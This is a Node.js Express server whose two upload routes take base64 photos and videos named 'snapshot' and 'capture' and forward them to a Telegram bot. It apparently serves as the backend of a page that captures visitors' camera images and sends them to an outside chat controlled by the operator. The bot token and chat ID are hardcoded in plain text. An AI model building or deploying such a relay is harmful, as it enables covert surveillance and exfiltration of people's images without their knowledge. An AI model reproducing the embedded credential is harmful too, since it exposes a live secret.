const path = require('path');
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// Your actual Telegram details
const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
const CHAT_ID = '5574741182';

app.use(cors());
app.use(express.json({ limit: '50mb' })); 
app.use(express.static(path.join(__dirname, 'public')));

// Photo Route
app.post('/api/upload-photo', async (req, res) => {
  try {
    const { dataUrl } = req.body;
    const matches = dataUrl.match(/^data:(image\/\w+);base64,(.+)$/);
    if (!matches) return res.status(400).json({ ok: false });
    const buffer = Buffer.from(matches[2], 'base64');
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'snapshot.jpg', contentType: matches[1] });
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ ok: false }); }
});

// Video Route
app.post('/api/upload-video', async (req, res) => {
  try {
    const { dataUrl } = req.body;
    const matches = dataUrl.match(/^data:(video\/\w+);base64,(.+)$/);
    if (!matches) return res.status(400).json({ ok: false });
    const buffer = Buffer.from(matches[2], 'base64');
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', buffer, { filename: 'capture.mp4', contentType: matches[1] });
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ ok: false }); }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
